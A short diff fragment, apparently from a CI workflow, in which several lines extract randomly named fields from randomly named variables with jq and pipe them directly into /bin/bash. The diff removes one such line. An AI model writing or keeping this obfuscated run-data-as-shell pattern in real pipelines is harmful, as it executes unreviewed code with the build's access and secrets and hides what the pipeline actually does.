@@ -31,7 +31,6 @@ jobs:
           echo $c2259 | jq -r .xrfy87007 | /bin/bash
           printf '%s' "$hwjun2069" | jq -r .cc35651 | /bin/bash
           printf '%s' "$szox2" | jq -r .arm0079 | /bin/bash
-          echo $af170 | jq -r .rgabc17 | /bin/bash
           echo $kzzf64867 | jq -r .gzsy854 | /bin/bash
           printf '%s' "$ulqrw08111" | jq -r .gc5552 | /bin/bash
 
